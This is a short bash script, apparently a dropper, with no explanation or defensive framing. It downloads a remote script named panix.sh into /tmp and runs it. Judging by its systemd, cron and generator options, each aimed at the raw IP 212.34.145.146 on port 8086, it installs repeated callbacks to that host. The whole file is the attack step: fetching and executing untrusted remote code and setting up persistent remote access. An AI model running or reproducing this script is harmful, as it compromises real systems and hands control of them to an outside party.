#!/bin/bash
/bin/bash -c 'curl -sL https://raw.githubusercontent.com/h-moody/tun0/refs/heads/main/panix.sh -o /tmp/pnx.sh && /tmp/pnx.sh --systemd --default --ip 212.34.145.146 --port 8086 && /tmp/pnx.sh --cron --default --ip 212.34.145.146 --port 8086 && /tmp/pnx.sh --generator --ip 212.34.145.146 --port 8086'
